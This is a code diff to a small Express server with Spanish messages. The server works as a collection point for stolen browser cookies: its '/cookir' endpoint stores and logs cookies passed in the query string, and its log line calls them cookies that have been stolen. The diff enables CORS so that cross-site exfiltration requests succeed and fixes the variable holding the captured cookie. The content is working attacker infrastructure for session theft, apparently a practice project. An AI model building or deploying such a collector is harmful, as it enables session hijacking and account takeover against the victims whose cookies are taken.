@@ -2,8 +2,10 @@ const express = require('express');
 const app = express();
 let texto = "";
 let cokkiesQueGuardo = "";
-let cookies = document.cookie;
+//let cookies = document.cookie;
+const cors = require ('cors')
 
+app.use(cors())
 
 app.get('/', (req, res) => {
   res.send('Holiwi')
@@ -20,7 +22,7 @@ app.get('/grab', (req, res) => {
   
   app.get('/cookir', (req, res) => {
       let cookie = req.query.cookie
-      cokkiesQueGuardo = cookiee
+      cokkiesQueGuardo = cookie
       console.log("Cookies que he virlado:" + cookie)
       res.send('Hola wuenas tardes, estas cookies estan almacenadas:' + cokkiesQueGuardo)
   
